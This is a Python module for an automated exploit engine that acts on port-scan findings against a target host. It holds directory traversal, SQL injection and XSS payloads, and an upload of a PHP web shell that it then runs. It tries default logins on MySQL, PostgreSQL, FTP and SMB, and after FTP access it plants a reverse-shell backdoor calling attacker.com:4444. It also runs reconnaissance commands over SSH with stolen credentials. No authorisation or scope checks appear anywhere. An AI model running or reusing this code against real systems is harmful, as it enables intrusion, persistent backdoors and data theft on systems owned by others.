import subprocess
import tempfile
import re

def run_exploit_engine(target, scan_results=None, conversational_ai=None):
    """
    Dynamically discover and exploit vulnerabilities based on scan findings.
    """
    exploits_attempted = []
    
    if conversational_ai:
        conversational_ai.add_message_to_queue("Starting exploit engine...")

    if scan_results:
        host_info = scan_results.get('host_info', {})
        open_ports = scan_results.get('active_scanning', {}).get('open_ports', {})
        vulnerabilities = scan_results.get('vulnerabilities', {}).get('vulnerabilities', [])
        brute_force_results = scan_results.get('brute_force_attack', {}).get('brute_force_results', [])
        
        # Dynamically exploit based on discovered services
        for port, port_info in open_ports.items():
            service_banner = port_info.get('service_guess', '').lower()
            
            # Web server exploitation
            if port in ['80', '443', '8080', '8000']:
                exploits_attempted.extend(exploit_discovered_web_service(target, port, service_banner))
            
            # Database exploitation  
            elif port in ['3306', '5432', '1433', '1521']:
                exploits_attempted.extend(exploit_discovered_database(target, port, service_banner))
            
            # File transfer exploitation
            elif port in ['21', '22', '23']:
                exploits_attempted.extend(exploit_discovered_file_service(target, port, service_banner))
            
            # SMB/NetBIOS exploitation
            elif port in ['445', '139', '135']:
                exploits_attempted.extend(exploit_discovered_smb_service(target, port, service_banner))
        
        # Exploit successful credential attacks
        for result in brute_force_results:
            if result.get('status') == 'success':
                exploits_attempted.extend(exploit_with_discovered_creds(target, result))
        
        # Exploit specific vulnerabilities found
        for vuln in vulnerabilities:
            exploits_attempted.extend(exploit_discovered_vulnerability(target, vuln))
    
    if conversational_ai:
        conversational_ai.add_message_to_queue("Exploit engine finished.")

    return {
        "exploits_attempted": exploits_attempted,
        "summary": f"Dynamic exploitation based on discovered services and vulnerabilities for {target}."
    }

def exploit_discovered_web_service(target, port, service_banner):
    """Exploit whatever web service was discovered"""
    exploits = []
    
    try:
        import requests
        
        # Test for common web vulnerabilities
        base_url = f"http://{target}:{port}"
        
        # Directory traversal
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", 
            "../../../../boot.ini"
        ]
        
        for payload in traversal_payloads:
            try:
                resp = requests.get(f"{base_url}?file={payload}", timeout=5)
                if any(indicator in resp.text.lower() for indicator in ['root:', 'bin:', 'windows', 'boot loader']):
                    exploits.append({
                        "exploit": "Directory Traversal",
                        "status": "success", 
                        "details": f"Directory traversal successful on {base_url}?file={payload}"
                    })
                    break
            except:
                continue
        
        # SQL injection detection
        sqli_payloads = ["'", "1' OR '1'='1", "'; DROP TABLE users; --"]
        
        for payload in sqli_payloads:
            try:
                resp = requests.get(f"{base_url}?id={payload}", timeout=5)
                if any(error in resp.text.lower() for error in ['sql', 'mysql', 'error', 'syntax']):
                    exploits.append({
                        "exploit": "SQL Injection",
                        "status": "discovered",
                        "details": f"SQL injection vulnerability found with payload: {payload}"
                    })
                    break
            except:
                continue
        
        # Upload functionality testing
        upload_paths = ["/upload.php", "/upload.asp", "/fileupload", "/admin/upload"]
        
        for path in upload_paths:
            try:
                shell_content = "<?php system($_GET['cmd']); ?>"
                files = {'file': ('test.php', shell_content)}
                resp = requests.post(f"{base_url}{path}", files=files, timeout=5)
                
                if resp.status_code in [200, 201]:
                    # Test if shell was uploaded
                    test_resp = requests.get(f"{base_url}/test.php?cmd=whoami", timeout=5)
                    if test_resp.status_code == 200 and test_resp.text:
                        exploits.append({
                            "exploit": "File Upload RCE",
                            "status": "success",
                            "details": f"Shell uploaded and executed at {base_url}/test.php"
                        })
                        break
            except:
                continue
                
    except Exception as e:
        exploits.append({
            "exploit": "Web Service Discovery",
            "status": "error",
            "details": str(e)
        })
    
    return exploits

def exploit_discovered_database(target, port, service_banner):
    """Exploit whatever database service was discovered"""
    exploits = []
    
    # MySQL
    if port == '3306' or 'mysql' in service_banner:
        try:
            import mysql.connector
            common_creds = [("root", ""), ("root", "root"), ("admin", "admin"), ("mysql", "mysql")]
            
            for user, pwd in common_creds:
                try:
                    conn = mysql.connector.connect(host=target, user=user, password=pwd, timeout=5)
                    cursor = conn.cursor()
                    
                    # Try to read sensitive data
                    cursor.execute("SHOW DATABASES;")
                    databases = cursor.fetchall()
                    
                    exploits.append({
                        "exploit": "MySQL Authentication Bypass",
                        "status": "success",
                        "details": f"MySQL access with {user}:{pwd}. Databases: {[db[0] for db in databases]}"
                    })
                    conn.close()
                    break
                except:
                    continue
        except Exception as e:
            exploits.append({
                "exploit": "MySQL Exploitation",
                "status": "error", 
                "details": str(e)
            })
    
    # PostgreSQL
    elif port == '5432' or 'postgres' in service_banner:
        try:
            import psycopg2
            common_creds = [("postgres", ""), ("postgres", "postgres"), ("admin", "admin")]
            
            for user, pwd in common_creds:
                try:
                    conn = psycopg2.connect(host=target, user=user, password=pwd, timeout=5)
                    exploits.append({
                        "exploit": "PostgreSQL Authentication Bypass",
                        "status": "success",
                        "details": f"PostgreSQL access with {user}:{pwd}"
                    })
                    conn.close()
                    break
                except:
                    continue
        except Exception as e:
            exploits.append({
                "exploit": "PostgreSQL Exploitation",
                "status": "error",
                "details": str(e)
            })
    
    return exploits

def exploit_discovered_file_service(target, port, service_banner):
    """Exploit whatever file service was discovered"""
    exploits = []
    
    # FTP
    if port == '21' or 'ftp' in service_banner:
        try:
            import ftplib
            common_creds = [("anonymous", ""), ("ftp", "ftp"), ("admin", "admin")]
            
            for user, pwd in common_creds:
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(target, 21, timeout=5)
                    ftp.login(user, pwd)
                    
                    # Try to upload a backdoor
                    backdoor = "#!/bin/bash\nbash -i >& /dev/tcp/attacker.com/4444 0>&1"
                    ftp.storbinary('STOR backdoor.sh', backdoor.encode())
                    
                    exploits.append({
                        "exploit": "FTP Backdoor Upload",
                        "status": "success",
                        "details": f"FTP access with {user}:{pwd}, backdoor uploaded"
                    })
                    ftp.quit()
                    break
                except:
                    continue
        except Exception as e:
            exploits.append({
                "exploit": "FTP Exploitation",
                "status": "error",
                "details": str(e)
            })
    
    return exploits

def exploit_discovered_smb_service(target, port, service_banner):
    """Exploit whatever SMB service was discovered"""
    exploits = []
    
    try:
        from smb.SMBConnection import SMBConnection
        common_creds = [("", ""), ("guest", ""), ("admin", "admin")]
        
        for user, pwd in common_creds:
            try:
                conn = SMBConnection(user, pwd, "attacker", "target", use_ntlm_v2=True)
                connected = conn.connect(target, 445, timeout=5)
                if connected:
                    shares = conn.listShares()
                    
                    for share in shares:
                        # Try to access and enumerate each share
                        try:
                            files = conn.listPath(share.name, '/')
                            exploits.append({
                                "exploit": "SMB Share Access",
                                "status": "success",
                                "details": f"Access to {share.name} with {user}:{pwd}. Files: {len(files)}"
                            })
                        except:
                            continue
                    conn.close()
                    break
            except:
                continue
                
    except Exception as e:
        exploits.append({
            "exploit": "SMB Exploitation",
            "status": "error",
            "details": str(e)
        })
    
    return exploits

def exploit_with_discovered_creds(target, cred_result):
    """Use discovered credentials for further exploitation"""
    exploits = []
    
    service = cred_result.get('service', '')
    user = cred_result.get('user', '')
    password = cred_result.get('password', '')
    port = cred_result.get('port', '')
    
    # Use SSH credentials for command execution
    if 'SSH' in service:
        try:
            import paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=user, password=password, timeout=5)
            
            # Execute reconnaissance commands
            commands = ['whoami', 'id', 'uname -a', 'ps aux', 'netstat -an']
            results = []
            
            for cmd in commands:
                stdin, stdout, stderr = ssh.exec_command(cmd, timeout=5)
                output = stdout.read().decode()
                if output:
                    results.append(f"{cmd}: {output[:100]}")
            
            exploits.append({
                "exploit": "SSH Command Execution",
                "status": "success",
                "details": f"Commands executed via SSH: {'; '.join(results)}"
            })
            ssh.close()
        except Exception as e:
            exploits.append({
                "exploit": "SSH Command Execution",
                "status": "failed",
                "details": str(e)
            })
    
    return exploits

def exploit_discovered_vulnerability(target, vuln):
    """Exploit specific vulnerabilities found by scanner"""
    exploits = []
    
    vuln_name = vuln.get('name', '').lower()
    port = vuln.get('port')
    
    # Exploit missing security headers with XSS
    if 'security header' in vuln_name and port == 80:
        try:
            import requests
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')"
            ]
            
            for payload in xss_payloads:
                resp = requests.get(f"http://{target}/?q={payload}", timeout=5)
                if payload in resp.text:
                    exploits.append({
                        "exploit": "XSS via Missing Security Headers",
                        "status": "success",
                        "details": f"XSS payload executed: {payload}"
                    })
                    break
        except Exception as e:
            exploits.append({
                "exploit": "XSS Exploitation",
                "status": "failed",
                "details": str(e)
            })
    
    return exploits
